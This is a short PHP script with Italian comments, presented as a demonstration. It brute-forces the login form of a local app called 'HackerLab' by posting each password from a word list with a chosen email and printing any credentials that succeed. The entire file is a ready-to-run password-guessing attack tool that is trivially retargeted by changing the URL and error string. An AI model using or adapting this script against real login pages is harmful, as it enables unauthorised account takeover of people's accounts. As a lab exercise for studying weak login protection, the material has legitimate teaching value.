<?php
/**
 * Filippo Finke
 * 
 * Script che permette di eseguire un attacco di tipo bruteforce al login di HackerLab.
 */

/**
 * L'url del percorso per il login di HackerLab.
 */
define("URL", "http://127.0.0.1/login");

/**
 * Metodo utilizzato per eseguire il login su HackerLab.
 * 
 * @param String $email L'email.
 * @param String $password La password.
 * @return Boolean True se l'accesso è stato eseguito, sennò false.
 */
function login($email, $password)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    // Imposto i campi richiesti dal percorso /login
    curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$email&password=$password");
    // Metodo POST
    curl_setopt($ch, CURLOPT_POST, 1);
    // Imposto a curl di seguire i redirect
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, "");
    $result = curl_exec($ch);
    curl_close($ch);
    unset($ch);
    // Controllo se è presente un errore oppure no.
    if(strpos($result, "Email o password errati!") !== false) {
        return false;
    }
    return true;
}

/**
 * Parte interattiva del programma.
 */
echo PHP_EOL."[i] Dimostrazione di bruteforce del login di HackerLab".PHP_EOL;
echo "[i] Autore: Filippo Finke".PHP_EOL;

$email = readline("[?] Inserisci una email: ");
$passwords = explode("\n", file_get_contents("passwords.txt"));
$passwordsCount = count($passwords);
echo "[i] Caricate $passwordsCount passwords!".PHP_EOL;
foreach ($passwords as $number => $password) {
    echo "[-] Accesso con ".str_pad($password, 15, " ", STR_PAD_BOTH)." -> ";
    if (login($email, $password)) {
        echo "SUCCESSO!".PHP_EOL;
        echo "[!] PASSWORD TROVATA: $password".PHP_EOL;
        echo "[!] CREDENZIALI -> $email:$password".PHP_EOL;
        break;
    } else {
        echo "FALLITO!";
    }
    echo " ($number/$passwordsCount)".PHP_EOL;
}